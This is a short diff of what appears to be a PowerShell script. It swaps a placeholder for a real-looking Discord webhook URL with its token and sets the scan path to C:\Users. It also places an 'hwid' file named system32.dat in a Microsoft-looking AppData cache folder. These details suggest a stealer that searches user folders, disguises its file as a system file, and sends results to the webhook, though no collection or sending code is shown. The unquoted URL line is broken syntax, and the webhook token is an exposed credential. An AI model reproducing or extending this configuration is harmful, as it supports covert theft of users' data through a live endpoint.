@@ -1,4 +1,4 @@
-$webhookUrl = "YOUR_NEW_WEBHOOK_URL_HERE"
+$webhookUrl = https://discord.com/api/webhooks/1485032402454581441/q-_dW5i362wv1YdZCLE3oHbOJJ6DeWuif6rzghbtOyfzlIVhfyprsWeGgm3aX-BmRwHb
 $startPath = "C:\Users"
 $hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
 $hwidFile = "$hwidFolder\system32.dat"
